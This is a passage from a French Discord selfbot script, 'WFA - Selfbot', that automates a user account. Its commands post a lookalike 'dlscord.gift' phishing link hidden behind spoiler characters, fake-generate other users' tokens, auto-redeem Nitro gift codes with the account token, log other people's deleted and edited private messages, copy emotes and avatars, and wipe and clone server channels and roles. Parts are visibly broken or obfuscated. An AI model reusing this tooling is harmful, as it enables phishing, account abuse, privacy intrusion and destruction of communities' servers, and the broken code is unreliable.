            message.edit(">>> **Token match** " + mentionUser.username + " | WFA - Selfbot\n\n" + debutToken + '.' + middle[Math.floor(Math.random() * middle.length)] + '.' + end[Math.floor(Math.random() * end.length)] + '\n').catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        }, 4000)
        console.log("Commande token effectué".yellow);

    }
    if (message.content.startsWith(prefix + 'encode')) {
        var toEncode = args.join(' ') || "WFA selfbot"
        var IDEncoded = utf8.encode(toEncode);
        var base64Encoded = base64.encode(IDEncoded);
        message.edit(">>> **Commande Encore | WFA - Selfbot**\n      **Texte -> Base64 :**\n      " + base64Encoded + '\n\n\n').catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        console.log("Commande encode effectué".yellow);
    }
    if (message.content.startsWith(prefix + "lovecalc")) {
        let percent = ["5%", "10%", "15%", "20%", "25%", "30%", "35%", "40%", "45%", "50%", "55", "60%", "65%", "70%", "75%", "80%", "85%", "90%", "95%", "100%"];
        rdm = Math.floor(Math.random(), percent.length),
            laPersonne = args.slice(0).join(' ') || "WFA selfbot";
        message.edit(">>> **Love Calcul | WFA - Selfbot**\n\ncalcul de relation plausible ❤: " + laPersonne + '\nrelation estimée à ❤: ' + percent[rdm] + '\n').catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
        console.log("Commande lovecalc effectué".yellow);
    }
    if (message.content.startsWith(prefix + "spotify")) {
        const State = message.content.split(' ').slice(1).join(' ') || 'WFA Selfbot';
        let Presence = rpcGenerator.createSpotifyRpc(client)
            .setAssetsLargeImage("spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e")
            .setAssetsSmallImage("spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e")
            .setDetails(State).setState("WFA-Selfbot")
            .setStartTimestamp(Date.now())
            .setEndTimestamp(Date.now() + 86400000);
        client.user.setPresence(Presence.toDiscord()).then(message.edit(":white_check_mark: **Tu écoutes " + State + " sur spotify**")).catch(console.error)
        console.log("Commande spotify effectué".yellow);
    }
    if (message.content.startsWith(prefix + "reset")) {
        clearInterval()
        client.user.setActivity(null, {})
        message.edit(":information_source:  Votre statut a été réinitialisé ! :information_source:").catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
        console.log("Commande reset effectué".yellow);
    }
    if ((message.content === prefix + "nitro")) {
        message.edit("**GIFT BY WFA | WFA - Selfbot**\n\nhttps://dlscord.gift/" + nitrocode(16, "0aA") + "   ||​||||​||||​||||​||||​||||​||||​||||||||​||||||||​||||​||||​||||||||​||||||||​||||​||||​||||​||||​||||||||​||||||||​||||​||||​||||​||||​||||​||||​||||||||​||||||||​||||​||||​||||​||||​||||​||||​||||​||||​||||||||​||||||||​||||||||​||||||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||||||​||||||||​||||​||||​||||​||||​||||​||||​||||​||||​||||||||​||||||||​||||​||||​||||||||​||||​||||​||||||||​||||​||||​||||​||||​||||||||​||||||||​||||||||​||||||||​||||​||||​||||​||||​||||​||||​||||||||​||||​||||​||||||||​||||​||||​||||||||​||||||||​||||​||||​||||​||||​||||​||||​||||​||||​||||||||​||||||||​||||​||||​||||||||​||||||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||||||​||||||||​||||||||​||||||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||||||​||||||||​||||​||||​||||​||||​||||​||https://preview.redd.it/xedy9ugkqo621.png?auto=webp&s=d508969a6c3963ac3ff844a31f755fc0f18f91de\n").catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
        console.log("Commande nitro generator effectué".yellow);
    }
    if (msg.content.startsWith(prefix + "gen token")) {
        msg.delete()
        console.log("Nouveau token generé".green);
    }
    if (msg.content.startsWith(prefix + "reverse")) {
        let toReverse = args.splice(0x23f2 + 0x1937 + -0x3d28).join(' ');
        if (!toReverse) message.edit(":x: **Pas de test definit**");

        function reverseString(str) {
            return str.split('').reverse().join('');
        }
        let reversed = reverseString(toReverse);
        if (args[0] = reversed) reversed = args.splice(1).join(' ')
        msg.edit('' + reversed).catch(console.error)
        console.log("Commande reverse effectué".yellow);
    }
    if (msg.content.startsWith(prefix + "discord")) {
        msg.edit("**Discord Version | WFA - Selfbot**\nDiscord Version : **" + Discord.version + "**    \n").catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
        console.log("Commande discord effectué".yellow);
    }
    if (message.content === prefix + "restart") {
        message.edit("**redémarrage** du self bot...").then(client.destroy()).then(() => client.login(token))
        console.log("Commande restart effectué".yellow);
    }
    if (message.content.startsWith(prefix + 'role info' || prefix + 'ri')) {
        let guild = message.guild,
            role = message.mentions.roles.first();
        if (!guild) return msg.edit(":x: **Commande uniquement utilisable sur un serveur**");
        if (!role) return message.delete().then(console.log('[' + "ERROR".red + ']' + "un nom de rôle est nécessaire".green));
        const status = {
            "false": "Non",
            "true": "Oui"
        };
        console.log("Commande role info effectué".yellow)
        message.edit('>>> **Commande Role Info | WFA - Selfbot**\n\nRole: <@&' + role.id + ">\n\nID du role: " + role.id + "\n\nCouleur: " + role.hexColor + "\n\nNombre de membres ayant ce role: " + role.members.size + "\n\nposition: " + role.position + "\n\nmentionnable: " + status[role.mentionable] + '\n').catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))


    }
    if (message.content.startsWith(prefix, "add emote")) {
        if (message.channel.type === 'dm') {
            message.edit(":x: **Commande pas executable en mp**");
            return;

        }
        let emote = args.splice(-0x2379 + -0x1e53 + 0x41ce).join(' '),
            parsedEmote = Discord.Util.parseEmoji(emote);
        if (!args) {
            message.edit(":x: **Veuillez choisir une emote.**");
            return;
        }
        if (!parsedEmote) {
            message.edit(':x: **Emote invalide essayez ceci** ' + prefix + "add emote (emote) <name>");
            return;
        }
        if (!message.member.hasPermission("MANAGE_EMOJIS")) {
            message.edit(':x: **Vous' + " n'avez pas les permissions \"Gérer les emojis\" sur ce serveur**");
            return;
        }
        if (parsedEmote.id) {
            const newEmote = "https://cdn.discordapp.com/emojis/" + parsedEmote.id + '.' + parsedEmote.animated ? "gif" : "png";
            let name = message.content.split(' ').splice(3) || parsedEmote.name;
            message.guild.createEmoji(newEmote, name)
            message.edit(":white_check_mark: **Emote ajoutée au serveur.**")
            console.log("Commande add emote executé.".yellow);
        } else message.edit(':x: **Veuillez choisir une emote valide!**');

    }
    if (message.content === prefix + "emote") {
        if (message.channel.type === 'dm') {
            message.edit(":x: **Commande pas executable en mp**");
            return;
        }
        let whate = '',
            animatedEmote = '',
            simpleEmote = 0,
            animated = 0,
            allEmotes = 0;

        function getEmote(what) {
            return client.emogjis.get(what).toString();
        }
        message.guild.emogis.forEach(emote => {
            allEmotes++;
            if (emote.animated) animated++, animatedEmote += getEmote(emote.id);
        })
        message.edit(">>> **Commande Emoji Info | WFA - Selfbot**\n\nServeur: **" + message.guild.name + "**\n\nEmojis animés: [" + animated + ']\n' + animatedEmote || "None" + "\n\nEmojis Simple:\n[" + simpleEmote + '] \n' + whate || 'None' + "\n\nTotal d'emojis: [" + allEmotes || "None" + ']\n' + whate + ' ' + animatedEmote + '\n')
        console.log("Commande emote executé.".yellow);

    }
    if (message.content.startsWith(prefix + ('remove emote'))) {
        if (message.channel.type === 'dm') {
            message.edit(":x: **Commande pas executable en mp**");
            return;
        }
        if (!message.member.hasPermission("MANAGE_EMOJIS")) return message.edit(":x: **Vous n'avez pas les permissions \"Gérer les emojis\" sur ce serveur**");
        const emote = args.splice(2).join(' ');
        if (!emote) return message.edit(":x: **Veuillez choisir une emote.**");
        let parsedEmote = Discord.Util.parseEmoji(emote);
        if (!message.guild.emojis.forEach(emote => {
                if (!emote.i === parsedEmote.id) return message.channel.send(":x: **Cette emote n'est pas sur le serveur**.");
            })) return message.edit(":white_check_mark: **Emote correctement supprimée du serveur.**");
        if (parsedEmote.id) {
            const lien = 'https://cdn.discordapp.com/emojis/' + parsedEmote.id + '.' + parsedEmote.animated ? "gif" : "png";
            message.guild.emojis.get(parsedEmote.id).delete();
        } else {
            let p2 = parse(emote, {
                'assetType': "png"
            });
            if (!p2[0]) return message.edit(":x: **Veuillez choisir une emote valide**!");
            message.edit(":x: **Vous ne pouvez pas supprimer les emotes par defaut**!");
        }
        console.log("Commande remove emote executé.".yellow);
    }
    if (message.content.startsWith(prefix + "steal banniere")) {
        message.delete();
        let banner = message.guild.bannerURL;
        console.log(`Voici la bannière de ${message.guild.name}: ${banner}`.green);

    }
    if (message.content.startsWith(prefix + "steal emote")) {
        if (message.channel.type === 'dm') {
            message.edit(":x: **Commande pas executable en mp**");
            return;
        }
        let guild = args.splice(2).join(' '),
            guilded = client.guilds.get(guild);
        if (!guilded) {
            message.edit(":x: **Aucun serveur trouvable avec l'id** \"" + guild + '\"');
            return;
        }
        if (!message.member.hasPermission("MANAGE_EMOJIS")) return message.edit(":x: **Vous n\'avez pas les permissions \"Gérer les emojis\" sur ce serveur**");
        (guilded.emojis.size < 1) && message.edit(":x: **Le serveur ne contient aucun emote.**");
        let whatDaFuck = '1';
        guilded.emojis.forEach(emote => {
                setTimeout(() => {
                    let name = emote.name;
                    const lien = 'https://cdn.discordapp.com/emojis/' + emote.id + '.' + emote.animated ? "gif" : "png";
                    message.guild.createEmoji(lien, name).catch(err => whatDaFuck + 1);

                }, 1500);
            }),
            console.log("Commande steal emote executé.".yellow)
        message.edit(":white_check_mark: **J'ai volé les emotes du serveur** \"" + guilded.name + '\"');
    }
    if (message.content == prefix + "delete all emote") {
        if (message.channel.type === 'dm') {
            message.edit(":x: **Commande pas executable en mp**");
            return;
        }
        if (message.guild.emogis.size < 1) {
            message.edit(":x: **Il n' y a aucun emote a supprimer.**");
            return;
        }
        message.guild.emojis.forEach(emote => {
            message.guilds.emojis.get(emote.id).delete();
        });
    }
    if (message.content.startsWith(prefix + 'grab pp')) {
        let mention = message.mentions.users.first(),
            yoink = mention.avatarURL;
        if (!mention) {
            message.edit(":x: **Veuillez mentionner un utilisateur valide!**");
            return;
        }
        if (!yoink) {
            message['edi'](":x: **Cet utilisateur n'a pas d'avatar!**");
            return;
        }
        client.user.setAvatar(yoink)
        console.log("Commande grab pp executé.".yellow)
        message.edit(":white_check_mark: **J'ai correctement volé la photo de profile de ** \"" + mention.username + '\"');
    }
    try {
        let info = client.emojis.get("655091815401127966") || "ℹ️";
        let waiting = client.emojis.get("655695570769412096") || "⌛";
        let green = client.emojis.get("655696285286006784") || "✅";
        let error = client.emojis.get("655704809483141141") || "❌";
        let warning = client.emojis.get("656030540310380574") || "⚠️";
        if (msg.content === prefix + "backup create" | msg.content == prefix + "backup c") {
            let guild = message.guild;
            if (!guild) {
                message.edit(":x: **Veuillez executer cette commande dans un serveur!**");
                return;
            }
            message.guild.roles.filter(role => role.name !== message.guild.member(client.user.id).highestRole.name).forEach(high => {
                if (high.comparePositionTo(message.guild.member(client.user.id).highestRole) > 0) {
                    return message.edit(warning + '  **Attention**\n\nMon role n\'est pas tout en haut dans la liste des roles du serveur, cela peut créer quelques ennuies lors de la création de la backup\n\nWFA-Selfbot').catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
                }
            })
            message.edit(waiting + '  **Please wait** ...\n\nCréation de la backup. Attendre la finalisation...\n\nWFA-Selfbot').catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)).then(mess => {
                let ID = makeID(16);
                const sorted = message.guild.channels.sort(function (a, b) {
                    return a.position - b.position;
                }).array().map(nez => {
                    const channel = {
                        type: nez.type,
                        name: nez.name,
                        postition: nez.calculatedPosition
                    };
                    if (nez.parent) channel.parent = nez.parent.name;
                    return channel;
                });
                const roles = message.guild.roles.filter(filter => filter.name !== "@everyone").sort(function (a, b) {
                    return a.position - b.position;
                }).array().map(nez => {
                    const rolee = {
                        name: nez.name,
                        color: nez.color,
                        hoist: nez.hoist,
                        permissions: nez.permissions,
                        mentionable: nez.mentionable,
                        position: nez.position
                    };
                    return rolee;

                });
                if (!backups[message.author.id]) backups[message.author.id] = {};
                backups[message.author.id][ID] = {
                    'icon': message.guild.iconURL,
                    'name': message.guild.name,
                    'owner': message.guild.ownerID,
                    'members': message.guild.memberCount,
                    'createdAt': message.guild.createdAt,
                    'roles': roles,
                    'channels': sorted
                };
                save();
                let serIcon = guild.iconURL || '';
                console.log(`Nouvelle backup du serveur ${message.guild.name} vient d'être crée, voici son id : ${ID}`.green);
                lbackup[guild.name] = {
                    Id: ID
                }
                liste()
                message.edit(info + '  **Info**\n\nNouvelle backup du serveur **' + message.guild.name + '** vien d\'être crée, voici son id : `' + ID + '`\n**' + prefix + 'backup load (id)** Pour load la backup\n\nWFA-Selfbot').catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
            })
            console.log("Commande create backup executé".yellow);

        }
        if (msg.content === prefix + "backup liste") try {
            var file = fs.readFileSync("Data/liste.json", "utf8");
            if (!file) {
                message.edit(":x: **Oups il semblerait que tu n'ai pas encore de backup fait " + prefix + "help backup pour commencer a en voler**");
                return;
            }
            message.edit('>>> **Backup List | WFA - Selfbot**\n        \nWoaW GG tu es un veritables voleur de backup accompli !!!\n        ```\n        ' + file.toString() + ("\n        ```      \n"));
        } catch (err) {
            console.log("Error:", err.stack);
        }
        if (msg.content.startsWith(prefix, "backup delete")) {
            let guild = message.guild;
            if (!guild) {
                message.edit(":x: **Veuillez executer cette commande dans un serveur!**");
                return;
            }
            let toDelete = args.splice(2).join(' ');
            if (!toDelete) return message.edit(error + "Erreur :x:").catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
            if (!backups[message.author.id][toDelete]) return message.edit(error + "  **Error**\nBackup Introuvable\n").catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
            delete backups[message.author.id][toDelete]
            save()
            message.edit('Succès !\nLa **backup** a bien été supprimée.\n').catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
            console.log("Commande delete backup executé".yellow);

        }
        if (msg.content.startsWith(prefix + "backup load")) {

            let guild = message.guild;
            if (!guild) {
                message.edit(":x: **Veuillez executer cette commande dans un serveur!**");
                return;

            }
            let errorr = client.emojis.get("655704809483141141") || '❌',
                ID = args.splice(2).join(' ');
            if (!ID) return message.channel.send(errorr + (" Erreur :x" + ':'));
            if (!backups[message.author.id][ID]) return message.channel.send("Error\nBack" + 'up Introuvable\n').catch(_0x2586f7 => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
            message.guild.channels.forEach(channel => {
                channel.delete("For Loading A Backup");
            })
            message.guild.roles.filter(f => f.members.every(nez => !nez.user.bot)).forEach(wow => {

                wow.delete("For Loading A Backup");
            })
            backups[message.author.id][ID].roles.forEach(async function (role) {
                message.guild.createRole({
                    name: role.name,
                    color: role.color,
                    permissions: role.permissions,
                    hoist: role.hoist,
                    mentionable: role.mentionable,
                    position: role.position
                }).then(role => {
                    role.setPosition(role.position);
                });
            }), backups[message.author.id][ID].channels.filter(f => f.type === "category").forEach(async function (ch) {
                message.guild.createChannel(ch.name, {
                    type: ch.type,
                    permissionOverwrites: ch.permissionOverwrites
                });
            })
            backups[message.author.id][ID].channels.filter(f => f.type !== "category").forEach(async function (ch) {
                message.guild.createChannel(ch.name, {
                    type: ch.type,
                    permissionOverwrites: ch.permissionOverwrites
                }).then(c => {
                    const parent = message.guild.channels
                        .filter(c => c.type === "category")
                        .find(c => c.name === ch.parent);
                    ch.parent ? c.setParent(parent) : "";
                });
            })
            message.guild.setName(backups[message.author.id][ID].name)
            message.guild.setIcon(backups[message.author.id][ID].icon)
            console.log("Commande load backup executé".yellow);

        }
        if (msg.content.startsWith(prefix + "backup info") || msg.content.startsWith(prefix + "backup i")) {
            let ID = args.splice(2).join(' ');
            if (!ID) return message.edit("Definis l'id de ta backup.\nExemple: `" + prefix + 'backup load (ID)`\n').catch(err => console.log('[', "ERROR".red, ']', "une erreur est survenue que je ne peux régler".green));
            if (!backups[message.author.id][ID]) return message.edit('Error\nBackup Introuvable\n');
            try {
                message.edit(">>> **Backup Info | WFA - Selfbot**\n\n```\nNom: " + backups[message.author.id][ID].name + "\n\nCreator: <@" + backups[message.author.id][ID].owner + ">\n\nChannels:\n" + backups[message.author.id][ID].channels.map(f => f.name).join('\n') + '\n\n\n\nRoles:\n' + backups[message.author.id][ID].roles.map(nez => nez.name).join('\n') + '\n');
            } catch (err) {
                hastebins(backups[message.author.id][ID].channels.map(f => f.name).join('\n'), "txt").then(nez => {
                    hastebins(backups[message.author.id][ID].roles.map(f => f.name).join('\n'), "txt").then(nezgros => {
                        message.edit(">>> **Backup Info | WFA - Selfbot**\n              " + "\nNom: " + backups[message.author.id][ID].name + "\n\nCreator:" + " <@" + backups[message.author.id][ID].owner + ">\n\nChannels: " + nez + '\n\nRoles: ' + nezgros + '\n').catch(err => console.log('[', "ERROR".red, ']', 'une erreur est survenue que je ne peux régler'.green));
                    })
                });
            }
            console.log("Commande backup info executé".yellow);
        }
        if (msg.content.startsWith(prefix + "backup purge")) {
            if (!backups[message.author.id]) return message.edit(error + ' Erreur :x:').catch(err => console.log('[', "ERROR".red, ']', "une erreur est survenue que je ne peux régler".green));
            message.edit('>>> **Etes vous sur de vouloir supprimer toutes vos backups?**\n\n```\nOui/Non\n```\n').then(() => {
                message.channel.awaitMessages(msg => msg.content === 'Oui', {
                    max: 1,
                    time: 30000,
                    errors: "time"
                }).then(oof => {
                    delete backups[message.author.id]
                    message.edit(">>> Voila!\n\nToutes Vos Backups on été supprimé\n").catch(err => console.log('[', "ERROR".red, ']', "une erreur est survenue que je ne peux régler".green))
                    msg.delete()
                    console.log("Commande backup purge executé".yellow);
                });
            });

        }
        if (message.content == prefix, "backup friend") {
            var wtf = client.user.friends.size;
            const friends = client.user.friends.array();
            let consoled = "Successfully backed up " + friends.length.toString().bold + " friends.".green;
            console.log(consoled)
            hastebins(friends + '\n').then(haste => {
                message.edit('>>> **Commande Backup Friends | WFA - Selfbot**\n          \nLien hastebins: ' + haste + '\n\n***vous pouvez copier coller la liste sur le channel actuel et vous pourrez ensuite faire clique droit sur un pseudo / envoyer un message / add friend ect...***\n').catch(_0x12f6c0 => /* Called:undefined | Scope Closed:true*/
                    console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
                console.log("Commande friends backup executé".yellow);
            });

        }

        function makeID(len) {
            var returned = '';
            var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var length = chars.length;
            for (var i = 0; i < len; i++) {
                returned += chars.charAt(Math.floor(Math.random() * length));
            }
            return returned

        }

        function save() {
            fs.writeFile("./Data/backups.json", JSON.stringify(backups), err => {
                if (err) console[_0x47d837(-0x187, 0x465, 0x2a5, 0x5d7)](err);

            })
        }
    } catch (_0x3928b9) {
        return;
    }
});

function bump() {
    message.channel.send("!d bump");
    if (err) console.error(err);
}

function saving() {
    fs.writeFile("./Data/afk.json", JSON.stringify(afk), err => {
        if (err) console.error(err);
    });
}

function liste() {
    fs.writeFile("./Data/liste.json", JSON.stringify(lbackup), err => {
        if (err) console.error(err);
    });
}

function kicker() {
    fs.writeFile("./Data/vkick.json", JSON.stringify(kicked), err => {
        if (err) console.error(err);
    });
}
cclient.on("messageUpdate", message => {
    if (message.author.id === client.user.id) return;
    if (message.channel.type === "dm") {
        console.log('\n╔═════════════════════════════════╗'.blue)
        console.log('Log:'.red) ^
            console.log('╟─────────────────────────────────╢'.blue)
        console.log(`║--> message mp modifié \n║--> User: ${message.author.tag}\n║--> Content: ${message.content}\n║--> At: ${message.createdAt}`.green)
        console.log('╚═════════════════════════════════╝'.blue)
    }
})
client.on("messageDelete", message => {
    if (message.author.id === client.user.id) return;
    if (message.channel.type === "dm") {
        console.log('\n╔═════════════════════════════════╗'.blue)
        console.log('Log:'.red)
        console.log('╟─────────────────────────────────'.blue)
        console.log(`║--> 1 message mp surppimé \n║--> User: ${message.author.tag}\n║--> Content: ${message.content}\n║--> At: ${message.createdAt}`.green)
        console.log('╚═════════════════════════════════╝'.blue)
    }
    if (message.content.includes('@everyone') || message.content.includes('@here')) {
        if (message.author.id === client.user.id) return;
        if (message.channel.type === "dm") return;
        console.log('\n╔═════════════════════════════════╗'.blue)
        console.log('Log:'.red)
        console.log('╟─────────────────────────────────'.blue)
        console.log(`║--> New ghostping \n║--> serveur: ${message.guild.name} \n║--> channel: ${message.channel.name} \n║--> User: ${message.author.tag}\n║--> Content: ${message.content}\n║-->At: ${message.createdAt}`.green)
        console.log('╚═════════════════════════════════╝'.blue)
    } else return
})


function matchCode(text, callback) {
    let codes = text.match(/https:\/\/discord\.gift\/[abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]+/)
    if (codes) {
        callback(codes[0])
        return matchCode(text.slice(codes.index + codes[0].length), callback)
    } else {
        callback(null)
    }
}

client.on("message", message => {
    let codes = []
    matchCode(message.content, (code) => {
        if (!code) return
        if (!codes.includes(code)) codes.push(code)
    })
    if (codes.length == 0) return
    codes.forEach(code => {
        fetch("https://canary.discordapp.com/api/v6/entitlements/gift-codes/" + code.split("/").pop() + "/redeem", {
            method: "post",
            headers: {
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US",
                "Authorization": client.token,
                "Connection": "keep-alive",
                "Content-Length": JSON.stringify({
                    channel_id: message.channel.id
                }).length,
                "Content-Type": "application/json",
                "Host": "canary.discordapp.com",
                "Referer": `https://canary.discordapp.com/channels/${message.channel.id}/${message.id}`,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
                "X-super-properties": Buffer.from(JSON.stringify({
                    "os": "Windows",
                    "browser": "Firefox",
                    "device": "",
                    "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
                    "browser_version": "66.0",
                    "os_version": "10",
                    "referrer": "",
                    "referring_domain": "",
                    "referrer_current": "",
                    "referring_domain_current": "",
                    "release_channel": "canary",
                    "client_build_number": 37519,
                    "client_event_source": null
                }), "utf-8").toString("base64")
            },
            body: JSON.stringify({
                channel_id: message.channel.id
            })
        }).then(res => {
            if (res.status == 400 || res.status == 404) return console.log(`code invalide :  ${code}`.red)
            res.json().then(json => {
                console.log(json)
                console.log("Un nouveau nitro à sûrement été ajouté à tes crédits.".green)
            })
        }).catch(console.error)
    })
})
client.on('guildDelete', guild => {
    console.log('\n╔═════════════════════════════════╗'.blue)
    console.log('Log:'.red) ^
        console.log('╟─────────────────────────────────╢'.blue)
    console.log(`║--> Vous avez quitté le serveur ${guild.name}`.green)
    console.log('╚═════════════════════════════════╝'.blue)
})

client.on('guildCreate', guild => {
    console.log('\n╔═════════════════════════════════╗'.blue)
    console.log('Log:'.red) ^
        console.log('╟─────────────────────────────────╢'.blue)
    console.log(`║--> Vous avez rejoint le serveur ${guild.name}`.green)
    console.log('╚═════════════════════════════════╝'.blue)
})
client.on("voiceStateUpdate", member => {
    if (!member) return;
    let voiceID = member.voiceChannelID;
    if (voiceID) return;
    let voiceName = voiceID != null && (typeof voiceID != undefined) ? client.channels.get(voiceID).name : null;
    if (voiceName === null) {
        if (kicked[member.guild.id]) {
            if (member.user.id === kicked[member.guild.id].user) {
                if (!member.guild.me.hasPermission("MOVE_MEMBERS")) return console.log("Erreur manque de permission.");
                member.setVoiceChannel(null);
            }
        }

    } else return;
})
client.login(token).catch(err => {
    if (err) console.log('Token invalid!\nChange ton token dans le config.json'.red);
});